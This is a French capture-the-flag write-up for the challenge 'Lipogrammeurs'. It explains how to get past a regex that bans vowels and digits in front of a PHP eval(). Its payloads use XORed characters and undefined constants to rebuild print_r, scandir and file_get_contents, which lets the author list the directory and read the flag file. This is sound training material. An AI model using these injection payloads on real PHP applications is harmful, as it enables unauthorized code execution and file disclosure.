# Lipogrammeurs - 200

## Description

`Vous avez trouvé cette page qui vous semble étrange. Pouvez-vous nous convaincre qu'il y a effectivement un problème en retrouvant le flag présent sur le serveur ?`

## Solution

La page principale contient un script php :

```php
if (isset($_GET['code'])) {
    $code = substr($code, 0, 250);
    if (preg_match('/a|e|i|o|u|y|[0-9]/i', $code)) {
        print($code);
        die('No way! PREG');
    } else {
        try {
            print($code);
            eval($code);
        } catch (ParseError $e) {
            die('No way! Go PARSE!');
        }
}
```

On veut donc faire évaluer le contenu de notre variable _code_, ainsi on pourra chercher le flag sur le serveur.

Pour cela nous devons réussir à passer la condition :

```php
preg_match('/a|e|i|o|u|y|[0-9]/i', $code)
```

Notre variable _code_ ne doit donc pas contenir de voyelles ni de chiffres, ce qui n'est pas très pratique si l'on veut dénicher le flag. Il faut donc trouver un moyen de passer outre.

Pour cela on va utiliser des particularités du langage php à notre avantage :

-   XORer deux caractères pour en obtenir un troisième.
-   Passer une variable sans l'avoir définie au préalable, car php estimera alors qu'il s'agit implicitement d'un string.

Préparons notre payload à l'aide de XORs :

```php
php > print_r(scandir("."));
Array
(
    [0] => .
    [1] => ..
    [2] => .git
)
php > $a = 'pr'.("!"^"H").'nt_r(sc'.("?"^"^").'nd'.("!"^"H").'r("."));';
php > eval($b);
Array
(
    [0] => .
    [1] => ..
    [2] => .git
)
```

Mais on ne passe finalement pas le test :

```php
php > print_r(preg_match('/a|e|i|o|u|y|[0-9]/i', $a));
1
php > echo $a;
print_r(scandir("."));
```

En effet, en utilisant XOR on peut retrouver les caractères qui nous sont interdits, mais pour passer la condition, il ne faut pas que les XORs soient interprétés avant la fonction `preg_match`.

Il faut donc contourner ce problème (d'où l'intérêt de la seconde particularité énoncée ci-avant) :

```php
php > $b = "(pr.('!'^'H').nt_r)((sc.('?'^'^').nd.('!'^'H').r)('.'));";
php > echo $b;
(pr.('!'^'H').nt_r)((sc.('?'^'^').nd.('!'^'H').r)('.'));
php > print_r(preg_match('/a|e|i|o|u|y|[0-9]/i', $b));
0
```

On arrive bien a contourner le test, mais qu'en est-il de la fonction `eval` ?

```php
php > eval($b);
#PHP Warning:  Use of undefined constant pr - assumed 'pr' (this will throw an Error in a future version of PHP) in php shell code(1) : eval()'d code on line 1
#PHP Warning:  Use of undefined constant nt_r - assumed 'nt_r' (this will throw an Error in a future version of PHP) in php shell code(1) : eval()'d code on line 1
#PHP Warning:  Use of undefined constant sc - assumed 'sc' (this will throw an Error in a future version of PHP) in php shell code(1) : eval()'d code on line 1
#PHP Warning:  Use of undefined constant nd - assumed 'nd' (this will throw an Error in a future version of PHP) in php shell code(1) : eval()'d code on line 1
#PHP Warning:  Use of undefined constant r - assumed 'r' (this will throw an Error in a future version of PHP) in php shell code(1) : eval()'d code on line 1
Array
(
    [0] => .
    [1] => ..
    [2] => .git
```

Impeccable ! En effet, à l'évaluation php estime que nos constantes non définies sont des strings, il s'occupe alors d'y concatener les XORs (cette fois évalués), ce que nous permet d'injecter notre payload.

On vérifie :

![lipo](../Images/lipogrammeurs_1.PNG)

Nous avons fait le plus dur, reste désormais à récupérer le flag à l'aide de la payload suivante :

```php
(pr.('!'^'H').nt_r)((f.('!'^'H').l.('^'^';')._g.('^'^';').t_c.('!'^'N').nt.('^'^';').nts)((sc.('?'^'^').nd.('!'^'H').r)('.')[('B'^'p')]));
# print_r(file_get_contents(scandir('.')[2]))
```

Aurions-nous eu tout faux ?

![lipo](../Images/lipogrammeurs_2.PNG)

On se rappelle que le flag était un fichier php, une inspection des sources aura tôt fait de nous rassurer :

![lipo](../Images/lipogrammeurs_3.PNG)
